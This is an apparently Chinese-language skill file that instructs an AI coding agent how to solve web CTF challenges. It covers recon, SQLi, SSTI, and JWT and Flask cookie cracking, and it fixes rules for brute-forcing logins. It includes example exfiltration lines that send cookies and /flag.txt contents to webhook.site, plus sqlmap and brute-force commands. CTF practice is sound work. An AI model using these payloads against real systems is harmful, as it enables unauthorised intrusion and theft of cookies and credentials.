---
name: ctf-web
description: 提供 CTF 挑战中的 Web 漏洞利用技术。当目标主要是 HTTP 应用、API、浏览器客户端、模板引擎、身份认证流程或智能合约前后端时使用，覆盖 XSS、SQLi、SSTI、SSRF、XXE、JWT、鉴权绕过、文件上传、请求走私、OAuth/OIDC、SAML、原型链污染等 Web 漏洞。不要用于原生二进制内存破坏、独立可执行文件逆向、磁盘/内存取证或纯密码学分析，除非 Web 漏洞仍是拿到 flag 的主要路径。
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
  author: Lukasz Jagiello
  keywords: web http https api browser endpoint xss csrf sqli sql ssti template ssrf xxe jwt oauth oidc saml upload deserialization prototype pollution request smuggling smart contract web3
---

# CTF Web 漏洞利用

把本技能当作 Web 类挑战的路由与执行指南。第一轮保持简短：先摸清应用结构、确认信任边界，然后再深入具体技术笔记。

## 定位

目标是 HTTP 应用、API、浏览器客户端、模板引擎、身份认证流程或智能合约前后端，需要把 Web 侧缺陷变成数据读取、权限提升或代码执行。

- **适用**：XSS、SQLi、SSTI、SSRF、XXE、JWT、鉴权绕过、文件上传、请求走私、OAuth/OIDC/SAML、原型链污染。
- **不适用**：原生二进制内存破坏 → `/ctf-pwn`；独立可执行文件逆向 → `/ctf-reverse`；磁盘/内存取证或纯密码学分析。

## 标准产出（Definition of Done）

1. **判定**：漏洞类型 + 位置（端点、参数、文件/行、配置项）。
2. **复现请求**：最小化的 `curl` 或脚本，含 Cookie/Token/关键请求头。
3. **验证**：flag 或等价证明（回显、外带记录、权限差异）。
4. **失败点**：还缺什么（回调通道、权限、绕过技巧），以及下一步候选路径。

## 检索与路由

入口索引：[catalog.md](catalog.md)（每篇参考文档一行：用途、关键章节）；程序化检索用 [catalog.json](catalog.json)。只加载命中的文件。

| 症状 / 题型 | 首个文件 |
|---|---|
| SQL 报错、注入过滤、二次注入 | [sql-injection.md](sql-injection.md) |
| 模板、LFI、SSRF、命令执行、XML | [server-side.md](server-side.md)、[server-side-exec.md](server-side-exec.md) |
| 反序列化、竞态、上传转 RCE | [server-side-deser.md](server-side-deser.md)、[server-side-exec-2.md](server-side-exec-2.md) |
| XSS、CSP、admin bot、DOM | [client-side.md](client-side.md)、[client-side-advanced.md](client-side-advanced.md) |
| 会话伪造、隐藏路由、IDOR、子域接管 | [auth-and-access.md](auth-and-access.md) |
| JWT/JWE 篡改与弱密钥 | [auth-jwt.md](auth-jwt.md) |
| OAuth/OIDC、SAML、CORS、CI/CD 密钥 | [auth-infra.md](auth-infra.md) |
| Node.js、原型链污染、JS 沙箱 | [node-and-prototype.md](node-and-prototype.md) |
| 智能合约 / Web3 | [web3.md](web3.md) |
| 版本/banner 匹配 CVE | [cves.md](cves.md) |
| 批量 payload 字典 | [pat-reference.md](pat-reference.md) |

## 前置条件

**Python 包（全平台）：**
```bash
pip install sqlmap flask-unsign requests httpx
```

**Linux（apt）：**
```bash
apt install hashcat jq curl
```

**macOS（Homebrew）：**
```bash
brew install hashcat jq curl
```

**Go 工具（全平台，需要 Go）：**
```bash
go install github.com/ffuf/ffuf/v2@latest
```

**手动安装：**
- ysoserial — [GitHub](https://github.com/frohoff/ysoserial)，需要 Java（Java 反序列化 payload）
- PayloadsAllTheThings — git clone 到 ctf-web/payloads/PayloadsAllTheThings（可通过安装脚本自动完成或按需懒加载）
  ```bash
  bash scripts/install_ctf_tools.sh pat   # 仅 PAT
  bash scripts/install_ctf_tools.sh all   # 包含 PAT 的全部工具
  # 手动兜底：
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
  ```
  > PAT 是可选的、按需使用的，加载技能时不强依赖。没有 PAT 技能也能正常工作（优雅降级）：`pat-reference.md` 提供离线索引和示例 payload；批量字典需要上面的 clone。

**MCP 服务（可选）：** Playwright MCP（[microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)）用于依赖浏览器的挑战（DOM XSS、admin bot、SPA 客户端密钥）；Burp Suite MCP（[PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)）用于协议层工作（HTTP/1.1+HTTP/2 头级控制、请求走私、通过 Collaborator 打盲 SSRF/XXE、代理历史正则挖掘）——详见 [tools-mcp.md](tools-mcp.md)。依赖 Burp MCP 前要做两件事：先启动 Burp，再启动 agent；关闭 Burp MCP 标签页里的两个审批开关，否则第一次工具调用会卡在模态对话框上。

## 参考文档（按需加载）

- [catalog.md](catalog.md) - 全量文档索引：每篇的用途、关键章节、字节数；配套 [catalog.json](catalog.json) 供程序化检索
- [sql-injection.md](sql-injection.md) - SQL 注入技术：鉴权绕过、UNION 提取、过滤绕过、二次注入、截断、竞态辅助泄露、INSERT ON DUPLICATE KEY UPDATE 覆盖密码、innodb_table_stats WAF 绕过
- [server-side.md](server-side.md) - PHP 类型混淆、php://filter LFI、Python str.format 路径穿越、SSTI（Jinja2、Twig、ERB、Mako、EJS、Vue.js、Smarty）、SSRF（Host 头、DNS rebinding、curl 重定向、未转义点号正则、SNI FTP 走私、mod_vhost_alias）、PHP hash_hmac NULL
- [server-side-2.md](server-side-2.md) - XXE（基础、OOB、DOCX 上传）、通过 X-Forwarded-For 的 XML 注入、PHP 可变变量、PHP uniqid 可预测文件名、连续正则替换绕过、命令注入（换行、黑名单、sendmail CGI、多条形码、git CLI）、GraphQL 注入（introspection、批处理、插值）
- [server-side-exec.md](server-side-exec.md) - 直接代码执行路径、上传转 RCE、反序列化相邻执行、LaTeX 注入、请求头与 API 滥用
- [server-side-exec-2.md](server-side-exec-2.md) - 更多执行链：SQLi 分片、路径解析器技巧、多语言 polyglot 上传、wrapper 滥用、文件名注入、文件名截断配合 BMP 像素 webshell
- [server-side-deser.md](server-side-deser.md) - Java/Python/PHP 反序列化与竞态条件 playbook、反序列化配合 PHP SoapClient CRLF SSRF
- [server-side-advanced.md](server-side-advanced.md) - 进阶 SSRF、路径穿越、压缩包、解析器、框架与现代应用服务器问题、Nginx alias 穿越
- [server-side-advanced-2.md](server-side-advanced-2.md) - Docker API SSRF、Castor/XML、Apache expression 读取、解析器差异、Windows 路径技巧、恶意 MySQL 服务器读文件
- [server-side-advanced-3.md](server-side-advanced-3.md) - 第 3 部分（CSAW/35C3/ASIS/PlaidCTF 2018）：WAV polyglot 上传、多斜杠 URL 绕过 `path.startswith`、Xalan XSLT `math:random()` 种子猜测、SoapClient `_user_agent` CRLF 方法走私、`gopher:///` 无 host URL scheme 绕过、攻击者指定出站 URL 导致 SSRF 凭据泄露
- [server-side-advanced-4.md](server-side-advanced-4.md) - 第 4 部分：WeasyPrint SSRF/文件读取（CVE-2024-28184）、MongoDB 正则/$where 盲注布尔预言、Pongo2 Go 模板注入、ZIP PHP webshell、basename() 绕过、wget CRLF SSRF→SMTP、Gopher SSRF 打 MySQL 盲注、React Server Components Flight RCE（CVE-2025-55182）、sslsplit+arpspoof 拦截 AMQP/TLS、CairoSVG XXE、Bazaar 仓库重建
- [client-side.md](client-side.md) - XSS、CSRF、缓存投毒、DOM 技巧、admin bot 滥用、请求走私、付费墙绕过
- [client-side-advanced.md](client-side-advanced.md) - CSP 绕过、Unicode 技巧、XSSI、CSS 窃取、浏览器规范化怪癖、postMessage null origin 绕过
- [auth-and-access.md](auth-and-access.md) - 认证/授权绕过、隐藏端点、IDOR、重定向链、子域接管、AI 聊天机器人越狱
- [auth-and-access-2.md](auth-and-access-2.md) - 第 2 部分（2018 年代）：`std::unordered_set` 桶碰撞鉴权绕过、`nodeprep.prepare` Unicode 同形字符用户名碰撞、SRP A=0/A=N 鉴权绕过、ArangoDB AQL MERGE 提权
- [auth-jwt.md](auth-jwt.md) - JWT/JWE 篡改、弱密钥、头注入、密钥混淆、重放
- [auth-infra.md](auth-infra.md) - OAuth/OIDC、SAML、CORS、CI/CD 密钥、IdP 滥用、登录投毒
- [node-and-prototype.md](node-and-prototype.md) - 原型链污染、JS 沙箱逃逸、Node.js 攻击链
- [web3.md](web3.md) - Solidity 与 Web3 挑战笔记
- [cves.md](cves.md) - 可通过 banner、响应头、依赖泄露或版本文本匹配的 CVE 技术
- [field-notes.md](field-notes.md) - 长篇利用笔记：SQLi、XSS、LFI、JWT、SSTI、SSRF、命令注入、XXE、反序列化、竞态、鉴权绕过的速查与多阶段链
- [tools-mcp.md](tools-mcp.md) - Web 方向的 MCP 服务集成：Playwright MCP（admin-bot DOM XSS 复现、实时 DOM/console/network 检查，`browser_network_requests` 只列端点，只有 `browser_network_request part="response-body"` 返回响应体）与 Burp Suite 官方 MCP（27 个工具、审批闸门会阻塞 agent、目标三元组把 socket 与 `Host:` 头解耦、`normalizeHttpContent` 重写请求前导中的 CR/LF、基于 map 的 HTTP/2 无法表达重复头、`send_to_intruder` 只做暂存、代理历史在 5000 字符处截断、Collaborator 的 `payloadId`/`customData` 仅 Pro 可用）；以及何时用它们而不是 curl 和 ffuf
- [python-requests.md](python-requests.md) - Python requests 工具箱：session 脚手架、类 Burp Intruder 的 fuzzer（同步 + ThreadPoolExecutor + httpx 异步）、从 pat-reference.md 字典投放 payload、头/参数喷洒、cookie/JWT、代理
- [pat-reference.md](pat-reference.md) — PayloadsAllTheThings 索引：XSS/SQLi/SSRF/SSTI/LFI/命令注入/上传的批量 payload（需要 PAT clone，见前置条件）

## 何时切换技能

- 如果目标是原生二进制、自定义 VM 或固件镜像，先切换到 `/ctf-reverse`。
- 如果 HTTP 漏洞只能拿到代码执行，而真正的难点变成内存破坏或 seccomp 逃逸，切换到 `/ctf-pwn`。

## 解题工作流

1. 识别真实边界：只有浏览器、只有后端、混合应用，还是认证流程。
2. 在 fuzzing 之前，先为每个主要功能抓一组正常的请求/响应对。
3. 从 JS bundle、响应头、路由和备用方法中枚举隐藏功能。
4. 归类可能的漏洞族：注入、授权、解析器不一致、上传、信任代理、状态机或客户端执行。
5. 先构造最小证明：泄露、绕过或原语。完整利用链留到后面。

### 批量 payload（PayloadsAllTheThings — 按需）

本技能加载时不依赖 PAT（优雅降级）：`pat-reference.md` 和内联示例可离线使用；批量 payload 需要 clone PAT。在摸清信任边界（第一轮工作流）之后，查看 [pat-reference.md](pat-reference.md) 中与漏洞类型匹配的目录，再搜索批量 payload：

```bash
# PAT payload 搜索（需要 clone PAT — 见前置条件；缺失时自动跳过）
ls ctf-web/payloads/PayloadsAllTheThings 2>/dev/null | head
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/null | head
```

或者通过 agent 工具（索引本身不需要 clone）：

```text
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "union select" ctf-web/payloads/PayloadsAllTheThings
```

如果 `ctf-web/payloads/PayloadsAllTheThings/.git` 不存在，agent 会按需懒加载：

```bash
[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
```

## 快速开始命令

```bash
# 侦察
curl -sI https://target.com
ffuf -u https://target.com/FUZZ -w wordlist.txt
curl -s https://target.com/robots.txt

# SQLi 快速测试
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# JWT 解码（不校验）
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Cookie 解码（Flask）
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt

# SSTI 探测
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name={{config}}"

# 请求检查
curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
```

## 登录爆破 — 硬性规则

当挑战需要爆破登录表单时，严格按以下规则执行，不要自行发挥。

1. **用户名永远是 `admin`。** 不要枚举用户名，不要生成用户名字典。即使挑战写着“弱口令”或“常用用户名”，这些提示描述的是**密码**——目标账号仍然是 `admin`。只有当挑战给出了**明确不同的字符串**（例如“用户名是 root”）时才换。

2. **密码字典必须是 Kali 上已有的字典文件。** 默认使用 `/usr/share/wordlists/metasploit/burnett_top_1024.txt`。不要自己创建密码文件——不要 `cat > passwords.txt`，不要在代码里硬编码密码列表，不要读取本地的 `Top1000.txt`。脚本必须直接从 Kali 字典文件逐行读取。

复杂场景（CSRF token、前端加密、JSON API、Basic Auth、多线程）见 [auth-and-access.md](auth-and-access.md) 中的参考脚本——但这些脚本同样必须遵守上面两条规则。

## 首先要回答的问题

- flag 最可能在哪里：浏览器、API 响应、本地文件、数据库行，还是内部服务？
- 应用是否信任用户可控数据进入模板、重定向、文件路径、请求头、序列化对象或后台任务？
- 是否存在多个解析器互相不一致：代理 vs 应用、URL 解析器 vs 抓取器、清洗器 vs 浏览器、序列化器 vs 过滤器？
- 能否先把漏洞变成更小的原语：读一个文件、伪造一个 token、调用一个内部端点、触发一次 bot 访问？

## 高价值侦察检查

- 在猜测 API 面之前，先读 HTML、内联脚本和打包后的 JS。
- 对比 UI 提交的内容与后端接受的内容；可选的 JSON 字段常常能打开隐藏路径。
- 尽早检查明显的元数据和辅助路径：`/robots.txt`、`/sitemap.xml`、`/.well-known/`、`/admin`、`/debug`、`/.git/`、`/.env`。
- 对感兴趣的路由尝试不同的方法和 Content-Type：`GET`、`POST`、`PUT`、`PATCH`、`TRACE`、JSON、表单、multipart、XML。
- 把文件上传、PDF/导出、webhook、OAuth 回调、admin bot 功能视为可能的利用放大器。

## 快速模式映射

- SQL 报错、异常过滤或依赖状态的数据库行为：从 [sql-injection.md](sql-injection.md) 开始。
- 模板、文件读取、SSRF、命令执行、XML 或解析器问题：从 [server-side.md](server-side.md) 和 [server-side-exec.md](server-side-exec.md) 开始。
- XSS、CSP 绕过、admin bot、客户端路由、DOM 问题或无脚本窃取：从 [client-side.md](client-side.md) 开始。
- 会话伪造、隐藏管理路由、JWT、OAuth、SAML 或弱信任边界：从 [auth-and-access.md](auth-and-access.md)、[auth-jwt.md](auth-jwt.md) 和 [auth-infra.md](auth-infra.md) 开始。
- Node.js 应用、原型链污染、VM 沙箱或打内网的 SSRF：补充 [node-and-prototype.md](node-and-prototype.md)。
- 智能合约前端或区块链集成应用：补充 [web3.md](web3.md)。

## 常见链路形态

- 侦察 -> 隐藏路由 -> 鉴权绕过 -> 内部文件读取 -> token 或 flag
- XSS 或 HTML 注入 -> admin bot -> 特权操作 -> 密钥泄露
- 路径穿越或上传 -> 配置/源码泄露 -> 密钥恢复 -> 会话伪造
- SSRF -> 元数据或内部 API -> 凭据泄露 -> 代码执行
- SQLi 或 NoSQL 注入 -> 凭据绕过 -> 第二阶段模板或上传滥用

## Webhook 回调（webhook.site）

任何需要回调 URL 的利用（XSS admin bot、SSRF 外带、OAuth 重定向滥用、带外数据盲注），都可以用 [webhook.site](https://webhook.site) 即时接收并查看传入请求。

**创建 token（获得回调 URL）：**
```bash
curl -X POST https://webhook.site/token
# 返回 {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
# 你的回调 URL：https://webhook.site/<uuid>
```

**在利用中使用回调 URL：**
```bash
# 带 webhook 回调的 XSS payload
curl -X POST https://target.com/api/report \
  -H "Content-Type: application/json" \
  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'

# 通过 webhook 外带 SSRF 数据
curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"

# OAuth 重定向滥用
curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
```

**获取最近一次收到的请求：**
```bash
curl "https://webhook.site/token/<uuid>/request/latest/raw" \
  -H "accept: application/json" \
  -H "api-key: <uuid>"
```

**webhook.site、Burp Collaborator、interactsh 怎么选：**
- **webhook.site** — 搭建最快、有浏览器可见的 UI、无需安装；适合快速 CTF 回调
- **Burp Collaborator** — 用 Burp Suite 做代理时，更适合盲 XSS/SSRF
- **interactsh** — 适合复杂多步利用的带外交互关联

## 深入笔记

确认挑战确实是 Web 为主、需要长篇利用目录后，再使用 [field-notes.md](field-notes.md)。

- 侦察、SQLi、XSS、路径穿越、JWT、SSTI、SSRF、XXE、命令注入速查
- 反序列化、竞态、文件上传转 RCE、多阶段链示例
- Node、OAuth/SAML、CI/CD、Web3、bot 滥用、CSP 绕过与现代浏览器技巧
- CVE 形态的 playbook 以及在现代 CTF 中仍会出现的老挑战模式

## 常见 flag 位置

- 文件：`/flag.txt`、`/flag`、`/app/flag.txt`、`/home/*/flag*`
- 环境：`/proc/self/environ`、进程命令行、调试配置转储
- 数据库：名为 `flag`、`flags`、`secret` 的表，或预置的挑战内容
- HTTP：自定义响应头、归档响应、隐藏路由、管理员导出
- 浏览器：隐藏 DOM 节点、`data-*` 属性、内联 state 对象、source map
